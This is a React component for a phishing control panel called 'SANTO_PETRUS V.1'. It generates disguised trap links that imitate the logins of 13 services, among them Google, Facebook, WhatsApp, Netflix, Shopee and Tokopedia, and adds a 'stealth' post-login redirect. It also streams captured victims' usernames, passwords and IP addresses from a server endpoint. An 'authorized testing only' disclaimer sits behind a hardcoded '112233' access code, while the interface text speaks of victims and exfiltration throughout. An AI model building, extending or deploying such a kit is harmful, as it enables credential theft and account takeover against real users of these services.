import React, { useState, useEffect } from 'react';
import { Skull, LayoutTemplate, Zap, Activity, Link, Copy, Check, Key, Globe, AlertTriangle, ShieldAlert } from 'lucide-react';

const TEMPLATES = [
  { id: 'google', name: 'Google Workspace / OAuth' },
  { id: 'fb', name: 'Facebook Standard Login' },
  { id: 'ig', name: 'Instagram Web Gateway' },
  { id: 'wa', name: 'WhatsApp Web OTP/QR' },
  { id: 'tiktok', name: 'TikTok Web Authorization' },
  { id: 'x', name: 'X (Twitter) Session' },
  { id: 'telegram', name: 'Telegram Web Authentication' },
  { id: 'linkedin', name: 'LinkedIn Professional Auth' },
  { id: 'netflix', name: 'Netflix Subscription Gateway' },
  { id: 'spotify', name: 'Spotify Premium Login' },
  { id: 'gojek', name: 'Gojek/Grab User/Driver Auth' },
  { id: 'shopee', name: 'Shopee Buyer/Seller Login' },
  { id: 'tokopedia', name: 'Tokopedia Account Check' }
];

export default function SantoPetrus() {
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  
  const [selectedTemplate, setSelectedTemplate] = useState(TEMPLATES[0].id);
  const [redirectUrl, setRedirectUrl] = useState('https://google.com');
  const [generatedLink, setGeneratedLink] = useState('');
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [victims, setVictims] = useState<any[]>([]);

  // Fetch real victims from server
  useEffect(() => {
    const interval = setInterval(() => {
      fetch('/api/santopetrus/captures')
        .then(res => res.json())
        .then(data => {
          if (Array.isArray(data)) setVictims(data);
        })
        .catch(() => {});
    }, 2000); // Polling every 2 seconds
    return () => clearInterval(interval);
  }, []);

  const handleForge = () => {
    setLoading(true);
    setTimeout(() => {
      // Create Base64 Payload
      const tName = TEMPLATES.find(t => t.id === selectedTemplate)?.name || selectedTemplate;
      const payload = btoa(`${tName}||${redirectUrl}`).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
      setGeneratedLink(`${window.location.origin}/auth/santo-${payload}`);
      setLoading(false);
    }, 800);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!isAuthenticated) {
    return (
      <div className="flex flex-col h-full bg-[#050000] items-center justify-center text-[#ff3333] border-l border-[#ef4444]/20 relative overflow-hidden">
        <div className="absolute inset-0 bg-[#ef4444]/5 blur-3xl pointer-events-none" />
        <div className="z-10 bg-slate-950 border border-[#ef4444]/30 p-8 flex flex-col items-center max-w-sm w-full animate-in zoom-in-95 duration-500">
          <Skull className="w-16 h-16 mb-6 text-[#ef4444] animate-pulse drop-shadow-[0_0_10px_rgba(255,0,0,0.8)]" />
          <h2 className="text-xl font-black mb-2 tracking-widest text-[#ef4444]">SANTO_PETRUS V.1</h2>
          <p className="text-[10px] text-center font-mono text-[#ef4444]/60 uppercase tracking-widest border-b border-[#ef4444]/20 pb-4 mb-4">
            Restricted Module. Administrator Clearance Required.
          </p>
          <div className="w-full text-[10px] font-mono text-[#ef4444]/40 text-center mb-8 bg-[#ef4444]/5 p-3 border border-[#ef4444]/20 uppercase tracking-wider">
            User Agreement: This utility is for enterprise security auditing and authorized penetration testing only. Do not deploy on unauthorized targets.
          </div>
          <div className="w-full space-y-4">
            <input 
              type="password" 
              value={password}
              onChange={e => setPassword(e.target.value)}
              onKeyDown={e => {
                if(e.key === 'Enter') {
                  if(password === '112233') setIsAuthenticated(true);
                  else setPassword('');
                }
              }}
              placeholder="ENTER CLEARANCE CODE"
              className="w-full bg-slate-950 border border-[#ef4444]/40 text-center text-[#ef4444] px-4 py-3 focus:outline-none focus:border-[#ef4444] uppercase tracking-[0.5em] font-mono text-xs shadow-[inset_0_0_15px_rgba(255,0,0,0.1)] transition-all"
            />
            <button 
              onClick={() => {
                if(password === '112233') setIsAuthenticated(true);
                else setPassword('');
              }}
              className="w-full py-4 bg-[#ef4444] hover:bg-[#ff3333] text-black font-black text-xs uppercase tracking-[0.3em] transition-all"
            >
              AUTHORIZE
            </button>
          </div>
        </div>
        <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(rgba(255,0,0,0.03)_1px,transparent_1px)] bg-[size:100%_4px] opacity-20 mix-blend-overlay"></div>
      </div>
    );
  }

  return (
    <div className="flex flex-col h-full bg-[#050000] text-[#ff3333] border-l border-[#ef4444]/20 relative overflow-hidden">
      {/* Background glow */}
      <div className="absolute top-0 right-0 w-96 h-96 bg-[#ef4444]/5 blur-3xl pointer-events-none rounded-full" />
      
      <div className="p-6 border-b border-[#ef4444]/20 bg-[#ef4444]/5 flex justify-between items-start z-10">
        <div>
          <h2 className="text-2xl font-black flex items-center mb-1 tracking-tighter text-[#ef4444] drop-shadow-[0_0_8px_rgba(255,0,0,0.8)]">
            <Skull className="w-7 h-7 mr-3 animate-pulse" /> SANTO_PETRUS V.1
          </h2>
          <p className="text-[10px] text-[#ef4444]/60 uppercase tracking-widest font-mono">
            Social Engineering & Credential Harvesting Gate
          </p>
        </div>
        <div className="px-3 py-1 bg-[#ef4444]/10 border border-[#ef4444]/30 text-[#ef4444] text-[9px] font-bold tracking-[0.2em] animate-pulse flex items-center">
          <ShieldAlert className="w-3 h-3 mr-2" /> PHISHING_SIMULATOR_ACTIVE
        </div>
      </div>

      <div className="p-6 grid grid-cols-1 md:grid-cols-2 gap-8 z-10 overflow-y-auto">
        
        {/* Left Column: Template Selection & Generation */}
        <div className="space-y-6">
          <div className="bg-[#100000] border border-[#ef4444]/30 p-5 relative group">
            <div className="absolute top-0 left-0 w-full h-[1px] bg-gradient-to-r from-transparent via-[#ef4444] to-transparent opacity-50" />
            
            <div className="flex items-center space-x-2 mb-6 border-b border-[#ef4444]/20 pb-3">
              <LayoutTemplate className="w-5 h-5 text-[#ef4444]/80" />
              <h3 className="text-xs font-bold uppercase tracking-[0.3em] text-[#ef4444]">Select Target Template</h3>
            </div>

            <div className="space-y-5">
              <div>
                <label className="block text-[10px] font-bold text-[#ef4444]/60 mb-2 uppercase tracking-widest font-mono">
                  13 Available Modules (Indonesian Top Sites)
                </label>
                <select 
                  value={selectedTemplate}
                  onChange={(e) => setSelectedTemplate(e.target.value)}
                  className="w-full bg-slate-950 border border-[#ef4444]/30 text-[#ff3333] rounded-sm px-4 py-3 focus:outline-none focus:border-[#ef4444] font-mono text-sm shadow-[inset_0_0_10px_rgba(255,0,0,0.05)] transition-all cursor-pointer appearance-none"
                >
                  {TEMPLATES.map(t => (
                    <option key={t.id} value={t.id}>[ {t.id.toUpperCase()} ] -- {t.name}</option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-[10px] font-bold text-[#ef4444]/60 mb-2 uppercase tracking-widest font-mono">Post-Login Redirect (Stealth Move)</label>
                <input 
                  type="text" 
                  value={redirectUrl}
                  onChange={e => setRedirectUrl(e.target.value)}
                  className="w-full bg-slate-950 border border-[#ef4444]/30 text-[#ff3333] rounded-sm px-4 py-3 focus:outline-none focus:border-[#ef4444] font-mono text-sm placeholder:text-[#ef4444]/20"
                />
              </div>

              <button
                onClick={handleForge}
                disabled={loading}
                className="w-full py-4 bg-[#ef4444] hover:bg-[#ff3333] text-black font-black text-sm uppercase tracking-[0.3em] transition-all active:scale-[0.98] flex items-center justify-center space-x-3 shadow-[0_0_20px_rgba(255,0,0,0.4)]"
              >
                <Zap className={`w-5 h-5 ${loading ? 'animate-pulse' : ''}`} />
                <span>{loading ? 'COMPILING_TEMPLATE...' : 'DEPLOY_TRAP_LINK'}</span>
              </button>
            </div>
          </div>

          {generatedLink && (
            <div className="bg-[#100000] border border-[#ef4444]/40 p-5 space-y-3 animate-in fade-in slide-in-from-bottom-4 duration-500">
              <div className="text-[10px] font-bold uppercase tracking-[0.2em] text-[#ef4444]/80">Credential Harvester Ready:</div>
              <div className="flex items-center justify-between bg-slate-950 border border-[#ef4444]/20 p-3 rounded-sm">
                <span className="font-mono text-xs text-white break-all pr-4">{generatedLink}</span>
                <button 
                  onClick={copyToClipboard}
                  className="p-2 border border-[#ef4444]/30 hover:bg-[#ef4444]/20 text-[#ef4444] rounded transition-all shrink-0"
                >
                  {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                </button>
              </div>
              <p className="text-[8px] uppercase tracking-widest text-[#ef4444]/40 text-center mt-2 font-mono flex items-center justify-center">
                <AlertTriangle className="w-3 h-3 mr-1" />
                Wait for the victim to authenticate.
              </p>
            </div>
          )}
        </div>

        {/* Right Column: Live Captures */}
        <div className="space-y-6">
          <div className="bg-[#100000] border border-[#ef4444]/30 p-5 min-h-[450px] flex flex-col">
            <div className="flex items-center justify-between mb-4 pb-2 border-b border-[#ef4444]/20">
              <div className="flex items-center space-x-2">
                <Activity className="w-5 h-5 text-[#ef4444] animate-pulse" />
                <h3 className="text-xs font-bold uppercase tracking-[0.3em] text-[#ef4444]">Live Credential Stream</h3>
              </div>
              <div className="text-[9px] font-mono text-[#ef4444]/60">
                {victims.length} CAPTURED
              </div>
            </div>

            <div className="flex-1 space-y-3 overflow-y-auto pr-2 custom-scrollbar">
              {victims.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center opacity-30">
                  <Key className="w-10 h-10 mb-3 text-[#ef4444]" />
                  <span className="text-[10px] uppercase tracking-[0.2em] font-mono">Listening for auth events...</span>
                </div>
              ) : (
                victims.map((v, idx) => (
                  <div key={v.id} className="bg-slate-950 border border-[#ef4444]/30 p-4 text-[10px] font-mono space-y-3 animate-in fade-in slide-in-from-right-4">
                    <div className="flex justify-between items-center text-[#ef4444] border-b border-[#ef4444]/10 pb-2">
                      <span className="font-bold tracking-widest flex items-center">
                        <Globe className="w-3 h-3 mr-2" /> {v.service}
                      </span>
                      <span>{v.time}</span>
                    </div>
                    
                    <div className="space-y-1">
                      <div className="text-white/40">Identity Trace:</div>
                      <div className="text-emerald-400 font-bold text-[10px] break-all">{v.user}</div>
                    </div>
                    
                    <div className="space-y-1">
                      <div className="text-white/40">Exfil Status:</div>
                      <div className="text-[#ff3333] font-bold text-xs">{v.pass}</div>
                    </div>

                    <div className="text-[8px] text-[#ef4444]/40 pt-2 border-t border-[#ef4444]/10 mt-2 flex justify-between">
                      <span>Source IP: {v.ip}</span>
                      <span>ID: {v.id}</span>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

      </div>
    </div>
  );
}
